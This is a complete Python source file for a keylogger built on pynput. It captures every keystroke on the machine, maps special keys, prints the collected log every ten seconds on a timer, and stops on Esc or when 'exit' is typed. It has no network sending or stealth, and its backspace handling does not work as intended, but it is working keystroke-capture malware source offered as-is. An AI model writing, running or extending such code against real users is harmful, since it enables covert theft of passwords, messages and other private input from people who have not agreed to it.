import pynput.keyboard
import threading

class Keylogger:
    def __init__(self):
        self.log = ''
        self.stop_keylogger = False

    def append_to_keylog(self, string):
        self.log += str(string)

    def on_press(self, key):
        current_key = ''
        try:
            current_key += str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.esc:
                return False
            elif key == pynput.keyboard.Key.space:
                current_key += ' '
            elif key == pynput.keyboard.Key.enter:
                current_key += '\n'
            elif key == pynput.keyboard.Key.backspace:
                current_key = current_key[:-1]
            elif key == pynput.keyboard.Key.tab:
                current_key += '\t'
            elif key == pynput.keyboard.Key.shift_l or key == pynput.keyboard.Key.shift_r:
                pass
            else:
                current_key += ' ' + str(key)

        self.append_to_keylog(current_key)

        # Check for "exit" keyword
        if "exit" in self.log.lower():
            self.stop_keylogger = True
            return False

    def report(self):
        print(self.log)
        self.log = ''
        if not self.stop_keylogger:
            timer = threading.Timer(10, self.report)
            timer.start()

    def start(self):
        keyboard_input = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_input:
            self.report()
            keyboard_input.join()

    

if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()
